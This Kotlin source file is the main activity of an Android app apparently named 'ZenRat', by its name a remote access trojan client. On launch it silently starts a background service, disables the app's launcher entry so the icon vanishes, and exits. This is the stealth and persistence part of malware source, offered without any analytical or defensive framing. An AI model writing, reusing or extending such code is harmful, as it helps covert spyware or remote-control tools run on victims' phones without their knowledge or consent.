package com.zenrat.client

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import com.zenrat.client.core.ZenRatService

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Start the background service
        val serviceIntent = Intent(this, ZenRatService::class.java)
        startService(serviceIntent)

        // Hide the icon
        hideIcon()

        // Finish the activity
        finish()
    }

    private fun hideIcon() {
        val packageManager = packageManager
        val launcherComponent = ComponentName(this, "com.zenrat.client.LauncherActivity")

        // Disable the launcher activity alias
        packageManager.setComponentEnabledSetting(
            launcherComponent,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
